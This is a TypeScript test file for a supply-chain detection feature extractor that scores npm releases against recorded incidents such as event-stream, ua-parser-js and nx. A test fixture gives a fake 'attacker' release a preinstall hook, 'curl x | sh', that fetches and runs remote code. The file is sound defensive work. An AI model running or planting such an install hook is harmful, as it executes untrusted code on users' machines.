import { readdirSync, readFileSync } from 'node:fs';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import type { Packument } from '../enrich/npm/types.js';
import { DATA_DIR } from '../../test/replay/server.js';
import { editDistance, featureArray, FEATURE_NAMES, featuresAsOf, MANIFEST_FEATURES } from './asof.js';

const H = 3600_000;
const registry = readdirSync(join(DATA_DIR, 'registry'))
  .filter((f) => f.endsWith('.json'))
  .sort()
  .map((f) => JSON.parse(readFileSync(join(DATA_DIR, 'registry', f), 'utf8')) as Packument & { name: string; time: Record<string, string>; versions: Record<string, any> });
const byName = new Map(registry.map((p) => [p.name, p]));

/** What the registry looked like at `asOf`, with today's packument-level fields replaced by junk. */
function snapshotAt(p: (typeof registry)[number], asOf: number): Packument {
  const time: Record<string, string> = {};
  const versions: Record<string, any> = {};
  for (const [v, t] of Object.entries(p.time)) {
    if (v === 'created' || v === 'modified' || Date.parse(t) > asOf) continue;
    time[v] = t;
    if (p.versions[v]) versions[v] = structuredClone(p.versions[v]);
  }
  time.modified = '2099-01-01T00:00:00.000Z';
  return { ...p, time, versions, maintainers: [{ name: 'someone-else' }], 'dist-tags': { latest: '999.0.0' } };
}

/** Same packument plus a later release by a new account with an install script and provenance. */
function withFutureRelease(p: (typeof registry)[number], asOf: number): Packument {
  const q = structuredClone(p) as typeof p;
  q.time['99.0.0'] = new Date(asOf + 2 * H).toISOString();
  q.versions['99.0.0'] = { name: p.name, version: '99.0.0', _npmUser: { name: 'attacker' }, maintainers: [{ name: 'attacker' }], scripts: { preinstall: 'curl x | sh' }, dependencies: { evil: '1' }, dist: { attestations: { url: 'https://x' } } };
  return q;
}

const releases = registry.flatMap((p) => Object.keys(p.versions).filter((v) => p.time[v]).map((v) => ({ p, v, t: Date.parse(p.time[v]!) })));

describe('featuresAsOf: no leakage (recorded replay packuments)', () => {
  it('covers every recorded release', () => {
    expect(releases.length).toBeGreaterThan(250);
  });

  it('a vector only depends on what the registry showed at asOf', () => {
    for (const { p, v, t } of releases) {
      const asOf = new Date(t + H);
      const full = featuresAsOf(p, p.name, v, asOf);
      expect(full, `${p.name}@${v}`).toBeDefined();
      expect(featuresAsOf(snapshotAt(p, asOf.getTime()), p.name, v, asOf), `${p.name}@${v} vs snapshot`).toEqual(full);
      expect(featuresAsOf(withFutureRelease(p, asOf.getTime()), p.name, v, asOf), `${p.name}@${v} vs future release`).toEqual(full);
    }
  });

  it('is stable after the release: scanning a year later gives the same vector (no hindsight, no age feature)', () => {
    for (const { p, v, t } of releases) {
      const soon = featuresAsOf(p, p.name, v, new Date(t + H));
      const later = featuresAsOf(snapshotAt(p, t + 365 * 24 * H), p.name, v, new Date(t + 365 * 24 * H));
      expect(later, `${p.name}@${v}`).toEqual(soon);
    }
  });

  it('ignores fields that can change after publishing (deprecated, registry flags, replay notes)', () => {
    const p = structuredClone(byName.get('ua-parser-js')!);
    const asOf = new Date(Date.parse(p.time['0.7.29']!) + H);
    const before = featuresAsOf(p, p.name, '0.7.29', asOf);
    p.versions['0.7.29'].deprecated = 'malware';
    p.versions['0.7.29'].hasInstallScript = true;
    delete p.versions['0.7.29']._replay;
    expect(featuresAsOf(p, p.name, '0.7.29', asOf)).toEqual(before);
  });

  it('a release is invisible before it is published', () => {
    const p = byName.get('event-stream')!;
    expect(featuresAsOf(p, p.name, '3.3.6', new Date(Date.parse(p.time['3.3.6']!) - 1))).toBeUndefined();
    expect(featuresAsOf(p, p.name, '3.3.6', new Date(Date.parse(p.time['3.3.6']!)))).toBeDefined();
  });
});

describe('featuresAsOf: the recorded incidents show their signals', () => {
  const at = (name: string, v: string) => {
    const p = byName.get(name)!;
    return featuresAsOf(p, name, v, new Date(Date.parse(p.time[v]!) + H))!;
  };

  it('event-stream 3.3.6: new publisher days earlier, dependency added in a patch', () => {
    const f = at('event-stream', '3.3.6');
    expect(f.publisher_prior_releases).toBe(1); // right9ctrl published 3.3.5 four days earlier
    expect(Math.round(f.days_since_new_publisher)).toBe(4);
    expect(f.bump_kind).toBe(1);
    expect(f.deps_added).toBe(1);
    expect(f.maintainers_added_vs_prev).toBe(0); // 3.3.5 already listed right9ctrl
    expect(at('event-stream', '3.3.5')).toMatchObject({ publisher_first_release: 1, publisher_differs_prev: 1, maintainers_added_vs_prev: 1 });
  });

  it('ua-parser-js 0.7.29: a new preinstall hook flagged as risky', () => {
    expect(at('ua-parser-js', '0.7.29')).toMatchObject({ install_hooks: 1, new_install_hooks: 1, prev_install_hooks: 0, install_script_share_prior: 0 });
    expect(at('ua-parser-js', '0.7.29').install_flags_risky).toBeGreaterThan(0);
  });

  it('rc 1.2.9: a dormant package releasing again', () => {
    const f = at('rc', '1.2.9');
    expect(f.days_since_prev_release).toBeGreaterThan(900);
    expect(f.gap_ratio).toBeGreaterThan(1);
  });

  it('nx 21.5.0 / 20.9.0: provenance dropped, two majors the same day', () => {
    const a = at('nx', '21.5.0');
    expect(a).toMatchObject({ has_provenance: 0, prev_has_provenance: 1 });
    expect(a.provenance_share_prior).toBeGreaterThan(0.5);
    expect(at('nx', '20.9.0').majors_released_24h).toBe(2);
    expect(at('nx', '20.9.0').is_backport).toBe(1);
  });

  it('chalk 5.6.1: publisher differs from the previous release, but has published chalk before', () => {
    // With the recorder fix the replay packument carries qix's earlier chalk release, as the live registry does.
    expect(at('chalk', '5.6.1')).toMatchObject({ publisher_first_release: 0, publisher_differs_prev: 1 });
    expect(at('chalk', '5.6.1').publisher_prior_releases).toBeGreaterThan(0);
  });

  it('young dependency needs a first-publish lookup, else NaN', () => {
    const p = byName.get('node-ipc')!;
    const asOf = new Date(Date.parse(p.time['9.2.2']!) + H);
    expect(featuresAsOf(p, p.name, '9.2.2', asOf)!.young_deps_added).toBeNaN();
    const peace = byName.get('peacenotwar')!;
    const first = Math.min(...Object.entries(peace.time).filter(([k]) => /^\d/.test(k)).map(([, t]) => Date.parse(t)));
    const f = featuresAsOf(p, p.name, '9.2.2', asOf, { firstPublished: (n) => (n === 'peacenotwar' ? (first <= asOf.getTime() ? first : null) : undefined) })!;
    expect(f.young_deps_added).toBe(1);
  });

  it('optional external facts stay NaN unless supplied', () => {
    const f = at('debug', '4.4.2');
    expect([f.scorecard_score, f.dependents_log10, f.downloads_trend, f.typosquat_distance].every(Number.isNaN)).toBe(true);
    const p = byName.get('debug')!;
    const g = featuresAsOf(p, 'debug', '4.4.2', new Date(Date.parse(p.time['4.4.2']!) + H), { dependents: 99, scorecardScore: 5.5, popularNames: ['debug', 'debux', 'chalk'] })!;
    expect(g).toMatchObject({ dependents_log10: 2, scorecard_score: 5.5, typosquat_distance: 1 });
  });

  it('featureArray keeps FEATURE_NAMES order', () => {
    const f = at('debug', '4.4.2');
    expect(featureArray(f)).toHaveLength(FEATURE_NAMES.length);
    expect(featureArray(f)[FEATURE_NAMES.indexOf('deps_count')]).toBe(f.deps_count);
  });
});

describe('editDistance', () => {
  it('is a bounded Levenshtein distance', () => {
    expect(editDistance('lodash', 'lodash')).toBe(0);
    expect(editDistance('lodash', 'lodahs')).toBe(2);
    expect(editDistance('cross-env', 'crossenv')).toBe(1);
    expect(editDistance('a', 'abcdefgh')).toBe(4);
  });
});

describe('featuresAsOf: releases npm has unpublished (time entry only)', () => {
  const withoutManifest = (p: (typeof registry)[number], v: string) => {
    const q = structuredClone(p);
    delete q.versions[v];
    return q;
  };

  it('is undefined unless allowMissingManifest is set', () => {
    const p = byName.get('nx')!;
    const asOf = new Date(Date.parse(p.time['21.5.0']!) + H);
    expect(featuresAsOf(withoutManifest(p, '21.5.0'), 'nx', '21.5.0', asOf)).toBeUndefined();
    expect(featuresAsOf(withoutManifest(p, '21.5.0'), 'nx', '21.5.0', asOf, { allowMissingManifest: true })).toBeDefined();
  });

  it('keeps every history feature and makes exactly MANIFEST_FEATURES NaN', () => {
    for (const { p, v, t } of releases) {
      const asOf = new Date(t + H);
      const full = featuresAsOf(p, p.name, v, asOf)!;
      const gone = featuresAsOf(withoutManifest(p, v), p.name, v, asOf, { allowMissingManifest: true })!;
      for (const n of FEATURE_NAMES) {
        if (MANIFEST_FEATURES.includes(n)) expect(gone[n], `${p.name}@${v} ${n}`).toBeNaN();
        else expect(gone[n], `${p.name}@${v} ${n}`).toEqual(full[n]);
      }
    }
  });

  it('downloads are optional facts and only enter when supplied', () => {
    const p = byName.get('rc')!;
    const asOf = new Date(Date.parse(p.time['1.2.9']!) + H);
    expect(featuresAsOf(p, 'rc', '1.2.9', asOf)!.downloads_weekly_log10).toBeNaN();
    const f = featuresAsOf(p, 'rc', '1.2.9', asOf, { downloadsWeekly: 999, downloadsTrend: 2 })!;
    expect(f.downloads_weekly_log10).toBeCloseTo(3);
    expect(f.downloads_trend).toBe(2);
  });
});
